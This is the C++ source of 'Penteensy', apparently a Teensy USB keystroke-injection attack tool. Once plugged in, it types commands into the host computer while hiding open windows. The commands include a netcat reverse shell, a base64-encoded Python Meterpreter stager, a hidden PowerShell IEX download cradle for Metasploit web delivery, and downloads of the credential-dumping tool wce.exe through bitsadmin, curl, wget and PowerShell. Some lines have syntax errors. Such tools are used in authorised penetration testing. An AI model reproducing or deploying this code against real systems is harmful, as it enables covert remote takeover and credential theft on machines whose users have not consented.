/**
    ################################################
    ##############     PENTEENSY      ##############
    ################################################
             Author: Matt Hand @matterpreter
                   www.matterpreter.com
    ################################################
    Based off of HID Teensy Sploit written by Mike
    Czumak (@SecuritySift). Thanks also to the guys
    at Offensive Security, Nikhil Mittal (Kautilya),
    and Adrian Crenshaw (PHUKD).
**/

/**
    ################################################
    ###############      CONFIG      ###############
    ################################################
**/

/**###############      CHANGE THESE       ##############**/
// IP for remote connections (equivalent of LHOST)
const char *remote_ip = "192.168.13.37";

// port for netcat shell only
const char *remote_nc_port = "4444";

// URL used by exploit/multi/script/web_delivery
const char *msf_web_delivery = "http://192.168.13.37:8080/update";

// string provided by payload/python/meterpreter/reverse_tcp & generate -t raw
const char *msf_python_handler = "import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHNvY2tldCxzdHJ1Y3QNCnM9c29ja2V0LnNvY2tldCgyLHNvY2tldC5TT0NLX1NUUkVBTSkNCnMuY29ubmVjdCgoJzE5Mi4xNjguMTMuMzcnLDQ0NDUpKQ0KbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQ0KZD1zLnJlY3YobCkNCndoaWxlIGxlbihkKTxsOg0KCWQrPXMucmVjdihsLWxlbihkKSkNCmV4ZWMoZCx7J3MnOnN9KQ==')))";

/** File download variables **/
const char *remote_url = "http://192.168.13.37/"; // URL of the remote machine
const char *remote_file = "wce.exe"; // File to download to target machine
const char *user_agent = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36";
const char *win_download_dir = "C:\temp\\"; // Windows folder to download files to


/**############     DON'T CHANGE THESE       ############**/
const char *lock_type = "CAPSLOCK"; // can use NUMLOCK, SCROLLLOCK, or CAPSLOCK
unsigned int lock_check_attempts = 2;
unsigned int lock_check_wait = 1000;
boolean dip_on = true; // change if there is no dip switch attached

/** reset keyboard keys **/
void clearKeys (){
    delay(200);
    Keyboard.set_key1(0);
    Keyboard.set_key2(0);
    Keyboard.set_key3(0);
    Keyboard.set_key4(0);
    Keyboard.set_key5(0);
    Keyboard.set_key6(0);
    Keyboard.set_modifier(0);
    Keyboard.send_now();
}

/** fetch led keys **/
int ledKeys(void) {return int(keyboard_leds);}

/** check if lock keys are on **/
boolean isLockOn(void) {
    if (lock_type == "NUMLOCK"){return ((ledKeys() & 1) == 1) ? true : false;}
    if (lock_type == "CAPSLOCK"){return ((ledKeys() & 2) == 2) ? true : false;}
    if (lock_type == "SCROLLLOCK"){return ((ledKeys() & 4) == 4) ? true : false;}
}

/** toggle the lock keys **/
void toggleLock(void) {
    if (lock_type = "NUMLOCK"){
          Keyboard.set_key1(KEY_NUM_LOCK);
    } else if (lock_type = "CAPSLOCK") {
          Keyboard.set_key1(KEY_CAPS_LOCK);
    } else if (lock_type = "SCROLLLOCK") {
          Keyboard.set_key1(KEY_SCROLL_LOCK);
    }
    Keyboard.send_now();
    clearKeys();
}

/** DIP switch pin initialization **/
// currently set for a 4 switch DIP on Teensy 3.2 soldered to the back of the board
unsigned int dip1 = 12;
unsigned int dip2 = 11;
unsigned int dip3 = 10;
unsigned int dip4 = 9;
void initDipSwitch(void) {
    pinMode(dip1, INPUT_PULLUP);
    pinMode(dip2, INPUT_PULLUP);
    pinMode(dip3, INPUT_PULLUP);
    pinMode(dip4, INPUT_PULLUP);
    delay(500);
}

/** Teensy 3.2 has LED on 13 **/
const int led_pin = 13;

/**
  ################################################
  ############    SHARED FUNCTIONS    ############
  ################################################
**/

/** blink the LED quickly **/
void blink_fast(void) {
    digitalWrite(led_pin, HIGH);
    delay(100);
    digitalWrite(led_pin, LOW);
    delay(100);
}

/** blink the LED slowly **/
void blink_slow(void) {
    digitalWrite(led_pin, HIGH);
    delay(1000);
    digitalWrite(led_pin, LOW);
    delay(1000);
}

/** test whether Windows is recognizing the device using the specified lock key **/
void wait_for_drivers(void) {
    boolean numLockTrap = isLockOn();
    while(numLockTrap == isLockOn()) {
        blink_fast();
        toggleLock();
        delay(lock_check_wait);
    }
    toggleLock();
    delay(lock_check_wait);
}

/**
  ################################################
  #############    *NIX FUNCTIONS    #############
  ################################################
**/

/** minimize open windows to avoid any conflicts **/
void mac_minWindows(void) {
    delay(200);
    Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
    Keyboard.send_now();
    Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI | MODIFIERKEY_ALT);
    Keyboard.send_now();
    Keyboard.set_key1(KEY_H);
    Keyboard.set_key2(KEY_M);
    Keyboard.send_now();
    clearKeys();
}

/** open Spotlight application to launch other apps **/
void mac_openSpotlight(void) {
    Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
    Keyboard.set_key1(KEY_SPACE);
    Keyboard.send_now();
    clearKeys();
}

/** open the command terminal **/
void mac_openTerminal(void) {
    delay(200);
    Keyboard.print("Terminal");
    delay(500);
    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    clearKeys();
    // Open a new window in case any commands are already running
    Keyboard.set_modifier(MODIFIERKEY_GUI);
    Keyboard.set_key1(KEY_N);
    Keyboard.send_now();
    clearKeys();
}

/** get remote shell via netcat. assumes nc is installed. **/
void netcatShell(void) {
    delay(1000);
    Keyboard.print(F("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ")); // for nc without -e
    Keyboard.print(remote_ip);
    Keyboard.print(F(" "));
    Keyboard.print(remote_nc_port);
    Keyboard.println(F(" > /tmp/f &"));
}

/** get remote shell via python. **/
void py_Meterpreter(void) {
    delay(1000);
    Keyboard.print("python -c \"");
    Keyboard.print(msf_python_handler);
    Keyboard.print("\"");
    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    clearKeys();
}

/** quit running app **/
void mac_quitApp(void) {
    Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
    Keyboard.set_key1(KEY_Q);
    Keyboard.send_now();
    clearKeys();
    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    clearKeys();
}

/** Download a file using wget **/
void wget_download(void) {
    delay(1000);
    Keyboard.print("wget --user-agent=\"");
    Keyboard.print(user_agent); // change the UA string
    Keyboard.print("\" ");
    Keyboard.print(remote_url);
    Keyboard.print(remote_file);
    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now()
    clearKeys();
}

/** Download a file using curl **/
void curl_download(void) {
    delay(1000);
    Keyboard.print("curl -A\"");
    Keyboard.print(user_agent); // change the UA string
    Keyboard.print("\" ");
    Keyboard.print(remote_url);
    Keyboard.print(remote_file);
    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    clearKeys();
}

/**
  ################################################
  ############   WINDOWS  FUNCTIONS   ############
  ################################################
**/

/** minimize all open windows **/
void win_minWindows(void) {
    delay(300);
    Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
    Keyboard.set_key1(KEY_M);
    Keyboard.send_now();
    clearKeys();
}

/** restore all previously minimized windows **/
void win_restoreWindows(void) {
    delay(300);
    Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
    Keyboard.send_now();
    Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI | MODIFIERKEY_SHIFT);
    Keyboard.send_now();
    Keyboard.set_key1(KEY_M);
    Keyboard.send_now();
    clearKeys();
}

/** close the current window **/
void win_closeWindow(void) {
    delay(300);
    Keyboard.set_modifier(MODIFIERKEY_ALT);
    Keyboard.set_key1(KEY_F4);
    Keyboard.send_now();
    clearKeys();
}

/** equivalent of Winkey + R **/
void win_run(void) {
    Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
    Keyboard.set_key1(KEY_R);
    Keyboard.send_now();
    clearKeys();
}

/** open cmd.exe **/
void win_openCmd(void) {
    delay(300);
    win_run();
    Keyboard.print("cmd.exe");
    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    Keyboard.send_now();
    clearKeys();
}

/** Download a file using BITS **/
void bits_download(void){
    Keyboard.print("bitsadmin.exe /transfer \"svchost\" ");
    Keyboard.print(remote_url)
    Keyboard.print(remote_file)
    Keyboard.print(" ")
    Keyboard.print("win_download_dir")
    Keyboard.print(remote_file)
    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
   clearKeys();
}

/** Download a file using Powershell 2.0's Net.WebClient **/
void powershell_download(void){
    Keyboard.print("powershell.exe -w hidden -c (New-Object Net.WebClient).DownloadFile('");
    Keyboard.print(remote_url)
    Keyboard.print(remote_file)
    Keyboard.print("', '")
    Keyboard.print(remote_file)
    Keyboard.print("')'")
    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    clearKeys();
}

/**
  ################################################
  ##################    MAIN    ##################
  ################################################
  #    Code to execute upon loading the Teensy   #
  ################################################
**/

/** Test to make sure the device is working (only for Mac) **/
void test_script(void) {
    delay(500);
    blink_fast();
    mac_openSpotlight(); // here I use spotlight to open Terminal as hot keys can vary
    mac_openTerminal();
    delay(2000);
    Keyboard.println("say 'It works!'");
    blink_slow();
}

/** Mac netcat script **/
void mac_netcat(void) {
    /** minimize active windows **/
    delay(500);
    blink_fast();
    mac_minWindows(); // if there are a lot of windows open, the first minimize
    mac_minWindows(); // sometimes leaves a stray window open which is why it's done twice
    /** open terminal and open a nc rev shell **/
    delay(500);
    mac_openSpotlight(); // use spotlight to open Terminal as hot keys can vary
    mac_openTerminal();
    delay(2500);
    Keyboard.println("cd /tmp"); // work out of the /tmp directory
    delay(2000);
    netcatShell(); // attempt to get a reverse shell back to attacker
    delay(500);
    Keyboard.println("exit");
    blink_slow();
}

/** Windows Powershell Web Delivery script **/
void win_pwrshllweb(void) {
    wait_for_drivers(); // wait until device is loaded
    blink_fast();
    win_minWindows(); // minimize any open windows
    // open cmd.exe
    delay(1000);
    win_openCmd();
    // feed in string for Metasploit's web_delivery
    delay(1000);
    Keyboard.print("powershell.exe -nop -w hidden -c $k=new-object net.webclient;");
    Keyboard.print("$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.");
    Keyboard.print("Credentials=[Net.CredentialCache]::DefaultCredentials;IEX ");
    Keyboard.print("$k.downloadstring('");
    Keyboard.print(msf_web_delivery);
    Keyboard.print("');");
    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    clearKeys();
    win_restoreWindows(); // restore previously minimized windows
    blink_slow();
}

/** Python Meterpreter reverse TCP **/
void pyMetRevTCP(void) {
    /** minimize active windows **/
    delay(500);
    blink_fast();
    mac_minWindows(); // if there are a lot of windows open, the first minimize
    mac_minWindows(); // sometimes leaves a stray window open which is why it's done twice
    /** open terminal and open a python meterpreter session **/
    delay(500);
    mac_openSpotlight(); // here I use spotlight to open Terminal as hot keys can vary
    mac_openTerminal();
    delay(2500);
    py_Meterpreter(); // attempt to get a reverse shell back to attacker
    delay(500);
    Keyboard.println("exit");
    blink_slow();
}

void setup(void) {
    delay(2000);
    if (dip_on) { // if a dip switch is attached (set in config section, default=true)
      initDipSwitch();
      if (!digitalRead(dip1)) { mac_netcat(); } // dip switch 1 = Netcat reverse connection
      if (!digitalRead(dip2)) { win_pwrshllweb(); } // dip switch 2 = WinPwrshllWeb
      if (!digitalRead(dip3)) { pyMetRevTCP(); } // dip switch 3 = Python MetRevTCP
      if (!digitalRead(dip4)) { test_script(); } // dip switch 4 = Functionality test for Mac
  } else { // if no dip switch attached, default to Windows Powershell web delivery
      win_pwrshllweb();
      }
}

void loop() {}
